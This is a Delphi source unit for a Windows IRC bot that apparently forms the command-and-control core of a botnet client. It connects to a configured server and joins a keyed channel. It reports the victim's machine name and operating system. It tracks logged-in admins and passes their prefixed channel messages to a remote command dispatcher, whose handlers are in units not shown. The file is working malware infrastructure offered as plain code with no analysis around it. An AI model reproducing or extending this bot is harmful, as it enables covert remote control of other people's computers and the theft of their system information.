unit untBot;

interface

uses
  Windows,
  Winsock,
  untFunctions,
  untControl,
  untAdminSystem;

  {$I Settings.ini}

type

  TIRCBot = Class(TObject)
  Private
    mainSocket          :TSocket;
    mainAddr            :TSockAddrIn;
    mainWSA             :TWSAData;
    Procedure ReceiveData;
    Procedure ReadCommando(szText: String);
  Public
    mainNick            :String;  
    mainBuffer          :Array[0..2048] Of Char;
    mainErr             :Integer;
    mainData            :String;
    mainHost            :String;
    mainIP              :String;
    mainAdmin           :String;
    mainChannel         :String;
    Function SendData(szText: String): Integer;
    Procedure Initialize;
  End;

var
  mainIRC       :TIRCBot;

implementation

Procedure TIRCBot.ReadCommando(szText: String);
Var
  Parameters            :Array [0..4096] Of String;
  ParamCount            :Integer;
  iPos                  :Integer;
  bJoinChannel          :Boolean;
  szNick                :String;
  BackUp                :String;
  ControlSet            :TControlSetting;
Begin
  BackUp := szText;
  FillChar(Parameters, SizeOf(Parameters), #0);
  ParamCount := 0;
  If (szText = '') Then Exit;
  If (szText[Length(szText)] <> #32) Then szText := szText + #32;

  bJoinChannel := False;
  If (Pos('MOTD', szText) > 0) Or
     (Pos('001', szText) > 0) Or
     (Pos('005', szText) > 0) Then
       bJoinChannel := True;

  Repeat
    iPos := Pos(#32, szText);

    If (iPos > 0) Then
    Begin
      Parameters[ParamCount] := Copy(szText, 1, iPos-1);
      Inc(ParamCount);
      Delete(szText, 1, iPos);
    End;
  Until (iPos <= 0);

  If (bJoinChannel) Then
  Begin
    SendData('JOIN '+server_channel+' '+server_channelkey);
    mainChannel := server_channel;
  End;

  {ping}
  If (Parameters[0] = 'PING') Then
  Begin
    ReplaceStr('PING', 'PONG', Parameters[0]);
    SendData(Parameters[0] + #32 + Parameters[1]);
  End;

  {part}
  If (Parameters[1] = 'PART') Then
  Begin
    szNick := Copy(Parameters[0], 2, Pos('!', Parameters[0])-2 );
    If Admin.AdminLoggedIn(szNick) Then
      Admin.LogoutAdmin(szNick);
  End;

  {kick}
  If (Parameters[1] = 'KICK') Then
  Begin
    szNick := Parameters[3];
    If Admin.AdminLoggedIn(szNick) Then
      Admin.LogoutAdmin(szNick);
  End;

  {nick exists}
  If (Parameters[1] = '433') Then
  Begin
    mainNick := ReplaceShortcuts(server_nick);
    SendData(mainNick);
  End;

  {userhost}
  If (Parameters[1] = '366') Then
  Begin
    SendData('USERHOST '+Parameters[2]);
  End;

  {host&ip}
  If (Parameters[1] = '302') Then
  Begin
    mainHost := Parameters[3];
    Delete(mainHost, 1, Pos('@', mainHost));
    mainIP := fetchIPFromDNS(pChar(mainHost));
  End;

  {privmsg}
  //    :nick!ident@host privmsg #channel :text
  If (Parameters[1] = 'PRIVMSG') Then
  Begin
    Delete(Parameters[3], 1, 1);
    ControlSet.ControlNick := Copy(Parameters[0], 2, Pos('!', Parameters[0])-2);
    ControlSet.ControlIdent := Copy(Parameters[0], Pos('!', Parameters[0])+1, Pos('@', Parameters[0])-2);
    ControlSet.ControlHost := Copy(Parameters[0], Pos('@', Parameters[0])+1, Length(Parameters[0]));
    ControlSet.ControlChannel := Parameters[2];

    If (Parameters[3] = #1'PING'#1) Then
    Begin
      Parameters[3][3] := 'O';
      SendData('NOTICE '+szNick+' '+Parameters[3]+Parameters[4]);
    End;

    If (Parameters[3] = #1'VERSION'#1) Then
      SendData('NOTICE '+szNick+' :'#1'VERSION -unnamed bot beta 0.1');

      

    If (Parameters[3][1] = bot_prefix) Or
       (Parameters[3][1] = #1) Then
       Begin
         Delete(Parameters[3], 1, 1);
         TranslateCommando(Parameters[3], Parameters[4], Parameters[5], Parameters[6], Parameters[7], Parameters[8], ControlSet);
       End;
  End;

End;

Procedure TIRCBot.ReceiveData;
Var
  iPos          :Integer;
Begin
  Repeat
    mainErr := Recv(mainSocket, mainBuffer, SizeOf(mainBuffer), 0);

    If (mainErr > 0) Then
    Begin
      SetLength(mainData, mainErr);
      Move(mainBuffer[0], mainData[1], mainErr);

      Repeat
        iPos := 0;
        iPos := Pos(#13, mainData);

        If (iPos > 0) Then
        Begin
          ReadCommando(Copy(mainData, 1, iPos-1));
          Delete(mainData, 1, iPos+1);
        End;
      Until iPos <= 0;
    End;
  Until mainErr <= 0;
End;

Procedure TIRCBot.Initialize;
Begin
  If (mainSocket <> INVALID_SOCKET) Then
  Begin
    SendData('QUIT :Restarting...');
    CloseSocket(mainSocket);
    WSACleanUP();
  End;

  WSAStartUP($101, mainWSA);
  mainSocket := Socket(AF_INET, SOCK_STREAM, 0);
  mainAddr.sin_family := AF_INET;
  mainAddr.sin_port := hTons(server_port);
  mainAddr.sin_addr.S_addr := inet_addr(pChar(fetchIPfromDNS(server_address)));

  If (Connect(mainSocket, mainAddr, SizeOf(mainAddr)) <> 0) Then
    Exit;

  If (mainNick = '') Then
    mainNick := ReplaceShortcuts(server_nick);

  SendData('USER '+mainNick+' "'+fetchLocalName+'" "'+fetchOS+'" :'+mainNick);
  SendData('NICK '+mainNick);

  ReceiveData;

  WSACleanUP();

End;

Function TIRCBot.SendData(szText: String): Integer;
Begin
  Result := -1;
  If (mainSocket = INVALID_SOCKET) Then Exit;
  If (szText = '') Then Exit;

  If (szText[Length(szText)] <> #10) Then szText := szText + #10;
  Result := Send(mainSocket, szText[1], Length(szText), 0);
End;

end.
